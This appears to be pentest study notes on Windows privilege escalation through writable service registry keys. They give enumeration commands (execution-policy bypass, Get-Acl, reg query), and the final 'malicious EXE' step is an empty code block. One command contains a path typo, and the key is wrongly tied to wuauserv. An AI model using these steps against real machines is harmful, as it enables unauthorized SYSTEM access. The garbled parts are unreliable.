Modifying the windows **Registry** directly allows attackers to change the executable path(``ImagePath``) of a service. If the current user has write access to the registry key of a privileged service (e.g. runningas SYSTEM), this can lead to **local privilege escalation** 

---

### Target Registry key

```cmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<service_name>
```

* this key stores the configuration for the **windows Update** service (``wuauserv``)
* if write permission exist here, attacker can hijack the service binary path

---

### Step by Step Enumeratrion and Exploitation

#### 1. Launch PowerShell with Execution Policy Bypass


```cmd
powershell.exe -ep bypass
```

#### 2. Check Permission on the Registry key

```powershell
Get-Acl -Path hklm:\SYSTEM\CurrentControlSet\Services\<service_name> | fl
```

* This lists the Access Control List(ACL) for the service registry key, showing who can read/write to it.

#### 3. Manually inspect the Key Using Reg.exe

```cmd
reg query HKEY_LOCAL_MACHINE\SYSTECurrentControlSet\Services\<service_name>
```

* View all values to the service registry path including ``ImagePath``

#### 4. Overwrite ``ImagePath`` to point a malicious EXE

```cmd

```